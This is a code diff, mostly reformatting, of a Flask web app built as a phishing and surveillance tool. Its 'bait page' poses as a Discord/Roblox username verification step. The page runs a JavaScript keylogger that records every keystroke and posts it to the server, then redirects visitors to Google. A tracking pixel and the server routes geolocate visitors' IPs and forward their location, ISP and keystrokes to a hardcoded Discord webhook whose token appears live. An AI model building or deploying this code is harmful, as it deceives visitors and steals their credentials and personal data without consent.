@@ -2,16 +2,17 @@ from flask import Flask, request, Response, render_template_string, jsonify, red
 import requests
 from datetime import datetime
 
+# --- CREATE THE FLASK APP (MUST BE TOP-LEVEL) ---
 app = Flask(__name__)
 
 # =============================================
-# CONFIGURATION (EDIT THESE TWO LINES)
+# CONFIGURATION (Edit only these two lines)
 # =============================================
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1532976374300541008/yUOYQh8Gfj1z6ISeclFYm8aOtxVjzT-KJKsaX2O4Q3-uVC4wWy8c03QaKPjeIfmVwCJY"  # REGENERATE THIS!
 
 IGNORE_IPS = [
     "127.0.0.1",
-    "YOUR_PUBLIC_IP",  # <-- Replace with your IP (whatismyip.com)
+    "YOUR_PUBLIC_IP",  # Replace with your actual IP (whatismyip.com)
 ]
 
 # =============================================
@@ -31,34 +32,56 @@ def get_ip_info(ip):
         resp = requests.get(f'https://ipapi.co/{ip}/json/', timeout=5)
         if resp.status_code == 200 and 'error' not in resp.json():
             d = resp.json()
-            return {'country': d.get('country_name'), 'regionName': d.get('region'), 'city': d.get('city'),
-                    'lat': d.get('latitude'), 'lon': d.get('longitude'), 'isp': d.get('org'),
-                    'proxy': d.get('proxy') or d.get('vpn') or False, 'timezone': d.get('timezone')}
-    except: pass
+            return {
+                'country': d.get('country_name'),
+                'regionName': d.get('region'),
+                'city': d.get('city'),
+                'lat': d.get('latitude'),
+                'lon': d.get('longitude'),
+                'isp': d.get('org'),
+                'proxy': d.get('proxy') or d.get('vpn') or False,
+                'timezone': d.get('timezone')
+            }
+    except:
+        pass
+    # Fallback
     try:
         resp = requests.get(f'http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,isp,proxy,timezone', timeout=5)
         if resp.status_code == 200 and resp.json().get('status') == 'success':
             d = resp.json()
-            return {'country': d.get('country'), 'regionName': d.get('regionName'), 'city': d.get('city'),
-                    'lat': d.get('lat'), 'lon': d.get('lon'), 'isp': d.get('isp'),
-                    'proxy': d.get('proxy') or False, 'timezone': d.get('timezone')}
-    except: pass
+            return {
+                'country': d.get('country'),
+                'regionName': d.get('regionName'),
+                'city': d.get('city'),
+                'lat': d.get('lat'),
+                'lon': d.get('lon'),
+                'isp': d.get('isp'),
+                'proxy': d.get('proxy') or False,
+                'timezone': d.get('timezone')
+            }
+    except:
+        pass
     return None
 
 def send_to_discord(title, fields, color=0x5865F2):
     if not DISCORD_WEBHOOK_URL:
         return
-    embed = {"title": title, "color": color, "fields": fields, "timestamp": datetime.utcnow().isoformat()}
+    embed = {
+        "title": title,
+        "color": color,
+        "fields": fields,
+        "timestamp": datetime.utcnow().isoformat()
+    }
     try:
         requests.post(DISCORD_WEBHOOK_URL, json={"embeds": [embed]})
-    except: pass
+    except:
+        pass
 
 # =============================================
 # ROUTES
 # =============================================
 @app.route('/')
 def home():
-    # Redirect to the main /verify page
     return redirect('/verify')
 
 @app.route('/pixel.png')
@@ -78,7 +101,14 @@ def pixel():
         title = "🎯 IMAGE CLICKED!" if click else "🎯 PAGE VIEWED"
         send_to_discord(title, fields, color=0xff0000 if click else 0x00ff00)
     # Transparent 1x1 GIF
-    gif = bytes([0x47,0x49,0x46,0x38,0x39,0x61,0x01,0x00,0x01,0x00,0x80,0x00,0x00,0xFF,0xFF,0xFF,0x00,0x00,0x00,0x21,0xF9,0x04,0x01,0x00,0x00,0x00,0x00,0x2C,0x00,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x02,0x01,0x00,0x00])
+    gif = bytes([
+        0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00,
+        0x01, 0x00, 0x80, 0x00, 0x00, 0xFF, 0xFF, 0xFF,
+        0x00, 0x00, 0x00, 0x21, 0xF9, 0x04, 0x01, 0x00,
+        0x00, 0x00, 0x00, 0x2C, 0x00, 0x00, 0x00, 0x00,
+        0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x01, 0x00,
+        0x00
+    ])
     return Response(gif, mimetype='image/gif')
 
 @app.route('/log_keys', methods=['POST'])
@@ -99,7 +129,7 @@ def log_keys():
     return jsonify({"status": "ok"})
 
 # =============================================
-# THE BAIT PAGE (Redirect-to-Google + Keylogger)
+# BAIT PAGE HTML (with keylogger & redirect)
 # =============================================
 BAIT_HTML = """
 <!DOCTYPE html>
@@ -109,57 +139,57 @@ BAIT_HTML = """
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Redirecting...</title>
     <style>
-        body { 
-            background: #0a0a14; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            margin: 0; 
-            font-family: Arial; 
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0a14;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
         }
-        .card { 
-            background: #16162b; 
-            padding: 40px; 
-            border-radius: 24px; 
-            text-align: center; 
-            border: 1px solid #2a2a4a; 
-            width: 400px; 
-            max-width: 90%; 
+        .card {
+            background: #16162b;
+            padding: 40px;
+            border-radius: 24px;
+            text-align: center;
+            border: 1px solid #2a2a4a;
+            width: 400px;
+            max-width: 90%;
         }
         h2 { color: white; margin-bottom: 10px; }
         p { color: #888; font-size: 14px; margin-bottom: 20px; }
-        input { 
-            width: 90%; 
-            padding: 14px; 
-            border-radius: 10px; 
-            border: 1px solid #3a3a5a; 
-            background: #0e0e1a; 
-            color: white; 
-            font-size: 16px; 
-            margin: 10px 0; 
+        input {
+            width: 90%;
+            padding: 14px;
+            border-radius: 10px;
+            border: 1px solid #3a3a5a;
+            background: #0e0e1a;
+            color: white;
+            font-size: 16px;
+            margin: 10px 0;
         }
         input:focus { outline: none; border-color: #5865F2; }
         #status { color: #5865F2; margin-top: 15px; font-size: 14px; }
-        .btn { 
-            background: #5865F2; 
-            color: white; 
-            border: none; 
-            padding: 12px 30px; 
-            border-radius: 10px; 
-            font-size: 16px; 
-            cursor: pointer; 
-            width: 100%; 
+        .btn {
+            background: #5865F2;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 10px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
         }
         .btn:hover { background: #4752c4; }
-        .loader { 
-            border: 3px solid #2a2a4a; 
-            border-top: 3px solid #5865F2; 
-            border-radius: 50%; 
-            width: 20px; 
-            height: 20px; 
-            animation: spin 1s linear infinite; 
-            margin: 10px auto; 
+        .loader {
+            border: 3px solid #2a2a4a;
+            border-top: 3px solid #5865F2;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
             display: none;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
@@ -187,36 +217,23 @@ BAIT_HTML = """
 <div class="card">
     <h2>⏳ Redirecting...</h2>
     <p>Please enter your username to continue to the secure page.</p>
-    
     <input type="text" id="usernameInput" placeholder="Enter your Discord / Roblox Username" autofocus>
     <button class="btn" id="submitBtn">Continue →</button>
-    
     <div id="status">🔐 Verification required</div>
     <div class="loader" id="loader"></div>
     <div class="progress-bar"><div class="progress-fill"></div></div>
 </div>
-
 <script>
-    // ==========================================================
-    // GLOBAL KEYLOGGER: Captures EVERY key typed on this page
-    // ==========================================================
     let keystrokes = [];
-
     document.addEventListener('keydown', function(event) {
         let key = event.key;
         if (key === ' ') key = '[Space]';
-        else if (key === 'Enter') key = '[Enter]\n';
+        else if (key === 'Enter') key = '[Enter]\\n';
         else if (key === 'Backspace') key = '[Backspace]';
         else if (key === 'Tab') key = '[Tab]';
-        else if (event.ctrlKey || event.metaKey) {
-            key = '[Ctrl+' + key + ']';
-        }
+        else if (event.ctrlKey || event.metaKey) key = '[Ctrl+' + key + ']';
         keystrokes.push(key);
     });
-
-    // ==========================================================
-    // SEND LOGS + REDIRECT TO GOOGLE
-    // ==========================================================
     function sendLogsAndRedirect() {
         const username = document.getElementById('usernameInput').value.trim();
         if (!username) {
@@ -224,15 +241,9 @@ BAIT_HTML = """
             document.getElementById('status').style.color = '#f55';
             return;
         }
-
-        const data = {
-            username: username,
-            keys: keystrokes.join('')
-        };
-
+        const data = { username: username, keys: keystrokes.join('') };
         document.getElementById('loader').style.display = 'block';
         document.getElementById('status').innerHTML = '⏳ Submitting...';
-
         fetch('/log_keys', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -242,7 +253,6 @@ BAIT_HTML = """
             document.getElementById('loader').style.display = 'none';
             document.getElementById('status').innerHTML = '✅ Redirecting...';
             document.getElementById('status').style.color = '#57F287';
-            // Redirect to Google after a short delay
             setTimeout(() => { window.location.href = 'https://www.google.com'; }, 1500);
         })
         .catch(() => {
@@ -251,18 +261,10 @@ BAIT_HTML = """
             setTimeout(() => { window.location.href = 'https://www.google.com'; }, 1500);
         });
     }
-
-    // Click the button to submit
     document.getElementById('submitBtn').onclick = sendLogsAndRedirect;
-
-    // Press Enter in the input box to submit
     document.getElementById('usernameInput').addEventListener('keypress', function(e) {
-        if (e.key === 'Enter') {
-            sendLogsAndRedirect();
-        }
+        if (e.key === 'Enter') sendLogsAndRedirect();
     });
-
-    // Log the VIEW when the page loads (silent ping)
     fetch('/pixel.png').catch(() => {});
 </script>
 </body>
@@ -285,5 +287,8 @@ def verify_page():
         send_to_discord("📄 BAIT PAGE VIEWED", fields, color=0x00ff00)
     return render_template_string(BAIT_HTML)
 
+# =============================================
+# LOCAL TESTING (ignored by Vercel)
+# =============================================
 if __name__ == '__main__':
-    app.run(debug=True)p
+    app.run(debug=True)
